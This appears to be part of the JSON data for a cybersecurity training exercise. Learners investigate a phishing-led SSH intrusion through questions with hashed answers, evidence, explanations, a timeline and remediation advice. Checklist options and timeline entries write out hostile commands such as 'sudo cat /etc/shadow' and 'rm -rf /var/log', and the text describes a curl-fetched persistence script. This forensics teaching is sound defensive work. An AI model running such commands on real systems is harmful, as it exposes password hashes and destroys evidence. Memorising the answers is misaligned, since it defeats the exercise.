+      "evidence": "/var/log/auth.log: \"Accepted password for jpike from 203.0.113.47\" at Nov 27 03:14:22. /etc/passwd maps jpike to Jordan Pike.",
+      "explanation": "The attacker logged in as jpike, Jordan's account, with the password Jordan typed into the phishing page about three hours earlier. Nobody had to break anything: a stolen, valid login is all it took."
+    },
+    {
+      "id": "ip",
+      "type": "ipv4",
+      "label": "Attacker IP address",
+      "prompt": "What IP address did the attacker connect from?",
+      "help": "The address the successful malicious login came from.",
+      "answerHashes": [
+        "e4035e9595a0bd7ce8f4b68ffb85f980ae4bd80d0c60fa03a4c0108b1c675f4f"
+      ],
+      "evidence": "/var/log/auth.log and last: jpike from 203.0.113.47 on Fri Nov 27, 03:14 to 03:41. The same address appears in the persistence script.",
+      "explanation": "203.0.113.47 is the only outside address that got in. 198.51.100.23 made over 200 noisy attempts but never succeeded, and 10.40.12.88 is Jordan's normal VPN address. Loud doesn't mean successful: always look for the Accepted line."
+    },
+    {
+      "id": "commands",
+      "type": "checklist",
+      "label": "Attacker commands",
+      "prompt": "Which of these did the attacker do? Check every one, and only those.",
+      "help": "Shell history records commands in the order they were typed.",
+      "options": [
+        {
+          "id": "useradd",
+          "text": "Created a new user account with useradd"
+        },
+        {
+          "id": "shadow",
+          "text": "Tried to read /etc/shadow with sudo"
+        },
+        {
+          "id": "copy",
+          "text": "Copied dispatch exports with cp"
+        },
+        {
+          "id": "scp",
+          "text": "Copied an archive off the server with scp"
+        },
+        {
+          "id": "tar",
+          "text": "Bundled files into an archive with tar"
+        },
+        {
+          "id": "curl",
+          "text": "Downloaded a file with curl"
+        },
+        {
+          "id": "rmlogs",
+          "text": "Deleted the system logs with rm -rf /var/log"
+        },
+        {
+          "id": "cron",
+          "text": "Added an entry to their crontab"
+        }
+      ],
+      "answerHashes": [
+        "9b0024711ce17eb29cd331404d3009d96e7c775c12ee5dfb172011dc555beb99"
+      ],
+      "evidence": "/home/jpike/.bash_history (a hidden file): everything after Jordan's own \"exit\", from whoami to the second exit. auth.log confirms the failed sudo at 03:16:48.",
+      "explanation": "The attacker looked around (whoami, id, uname), tried and failed to become root, copied the customer and driver exports into a hidden folder, bundled them with tar, downloaded a script from their own server with curl, and scheduled it with cron. They never created a user, never deleted logs, and haven't sent the archive anywhere yet: it's still sitting in /tmp."
+    },
+    {
+      "id": "persistence",
+      "type": "mechanism-path",
+      "label": "Persistence",
+      "prompt": "How does the attacker keep access after the password reset?",
+      "help": "Persistence is anything that lets an attacker back in, or keeps their code running, after the original way in is closed.",
+      "mechanisms": [
+        {
+          "id": "sshkey",
+          "text": "SSH key added to authorized_keys"
+        },
+        {
+          "id": "cron",
+          "text": "Scheduled cron job"
+        },
+        {
+          "id": "useradd",
+          "text": "New user account"
+        },
+        {
+          "id": "systemd",
+          "text": "systemd service"
+        }
+      ],
+      "pathLabel": "Full path of the file it runs",
+      "answerHashes": [
+        "144ad00e60ab62dd3e3c81a496eb5b5ff7cf08f288bf511372dafee6acf9405f"
+      ],
+      "evidence": "/var/spool/cron/crontabs/jpike runs /home/jpike/.local/share/.sysd-update.sh every 15 minutes. /var/log/syslog shows it running all day, long after the 4:50 PM reset, and ps shows it running now.",
+      "explanation": "A cron job runs the hidden script every 15 minutes as jpike. The script checks in with 203.0.113.47 and runs whatever comes back. Resetting the password closed the front door, but this was already inside. To clean up: remove the crontab entry and the script, then check for anything it pulled down."
+    },
+    {
+      "id": "staged",
+      "type": "path",
+      "label": "Data staged for theft",
+      "prompt": "Where did the attacker stage the data they plan to steal?",
+      "help": "Staged data is copied and packed up, ready to send out. Give the full path.",
+      "answerHashes": [
+        "f254b6e8dbe01a11faa2bad6b69722bcf4349019d6d31d4c3777ba826a4787ee",
+        "1f2434d0974e28b8d21434f4343a020c927065570d3ccdee466af534a288615b"
+      ],
+      "evidence": "ls -la /tmp shows the hidden folder .cache-x (owned by jpike) holding sys-update.tgz, created Nov 27 03:33. The shell history shows what went into it.",
+      "explanation": "The attacker packed customers_2026Q4.csv and driver_roster.csv into /tmp/.cache-x/sys-update.tgz. The dot hides the folder from a plain ls, and the harmless-sounding name is camouflage. The originals in /srv/dispatch/exports are where the data came from, not where it was staged."
+    }
+  ],
+  "debrief": {
+    "timeline": [
+      {
+        "time": "Fri 12:07 AM",
+        "text": "The phishing email \"Your password expires in 24 hours\" arrives from kestre1-logistics.com (a 1 in place of the l).",
+        "source": "Night 1 inbox, email 3"
+      },
+      {
+        "time": "Fri ~12:10 AM",
+        "text": "Jordan clicks the link, types their password into verify-acct.net, and only then forwards the email to the SOC.",
+        "source": "Jordan's statement to Rhea Vance"
+      },
+      {
+        "time": "Fri 3:14 AM",
+        "text": "One failed try, then a successful SSH login as jpike from 203.0.113.47.",
+        "source": "/var/log/auth.log and last",
+        "clue": "login"
+      },
+      {
+        "time": "Fri 3:15 AM",
+        "text": "The attacker looks around: whoami, id, uname -a.",
+        "source": "/home/jpike/.bash_history",
+        "clue": "history"
+      },
+      {
+        "time": "Fri 3:16 AM",
+        "text": "Tries sudo cat /etc/shadow to grab every password hash on the server. Refused: jpike isn't a sudoer.",
+        "source": "/var/log/auth.log and .bash_history",
+        "clue": "history"
+      },
+      {
+        "time": "Fri by 3:33 AM",
+        "text": "Copies customers_2026Q4.csv and driver_roster.csv into the hidden folder /tmp/.cache-x, packs them into sys-update.tgz, and deletes the loose copies.",
+        "source": "ls -la /tmp/.cache-x and .bash_history",
+        "clue": "staging"
+      },
+      {
+        "time": "Fri 3:38 AM",
+        "text": "Downloads .sysd-update.sh from 203.0.113.47 with curl into a hidden folder and makes it executable.",
+        "source": "ls -la ~jpike/.local/share and the script itself",
+        "clue": "script"
+      },
+      {
+        "time": "Fri 3:39 AM",
+        "text": "Adds a crontab entry that runs the script every 15 minutes.",
+        "source": "/var/spool/cron/crontabs/jpike and /var/log/syslog",
+        "clue": "cron"
+      },
+      {
+        "time": "Fri 3:41 AM",
+        "text": "Logs out after 27 minutes on the server.",
+        "source": "/var/log/auth.log and last",
+        "clue": "login"
+      },
+      {
+        "time": "Fri 3:45 AM on",
+        "text": "Cron starts the script every 15 minutes. It checks in with 203.0.113.47 and runs whatever comes back.",
+        "source": "/var/log/syslog",
+        "clue": "cron"
+      },
+      {
+        "time": "Fri 4:50 PM",
+        "text": "IT resets Jordan's password. The cron job keeps running anyway: a password reset doesn't remove persistence.",
+        "source": "Handoff from Rhea Vance"
+      },
+      {
+        "time": "Sat 12:00 AM",
+        "text": "You connect. The script is still running as jpike, and the archive is still sitting in /tmp.",
+        "source": "ps aux and ls -a /tmp"
+      }
+    ],
+    "audit": {
+      "title": "Why the attacker's commands were still on disk",
+      "text": "Kestrel's shell audit policy, /etc/profile.d/kestrel-audit.sh, sets PROMPT_COMMAND='history -a', so bash writes each command to ~/.bash_history the moment it runs instead of at logout. A dropped connection, or clearing the shell's in-memory history, can't erase what's already been written. Without that policy, this case would have had a lot less to go on.",
+      "match": [
+        {
+          "shows": "/etc/profile.d/kestrel-audit.sh"
+        }
+      ],
+      "seen": "You read the policy during the shift.",
+      "unseen": "You didn't open it tonight. It's worth a look: cat /etc/profile.d/kestrel-audit.sh"
+    },
+    "recommendations": [
+      "Remove the persistence: delete jpike's crontab entry and /home/jpike/.local/share/.sysd-update.sh, stop the running script (PID 3431), and check for anything it downloaded.",
+      "Block 203.0.113.47 at the firewall and search every other server's logs for it.",
+      "Keep /tmp/.cache-x/sys-update.tgz as evidence, and treat the customer and driver data as exposed until the network logs prove otherwise.",
+      "Require multifactor authentication for remote logins, so a stolen password alone isn't enough to get in.",
+      "Only allow SSH to kl-rpt-01 over the VPN, never straight from the internet.",
+      "Report a click right away, even after forwarding the email. The attacker was in three hours after Jordan's click; the reset came thirteen hours after that."
+    ],
+    "nextNight": "Open question for tomorrow night: the archive is packed, but the attacker never ran scp or anything else to send it. The script phones home every 15 minutes, though, and runs whatever it's told. Did anything leave? That's a job for the network logs."
+  }
+}
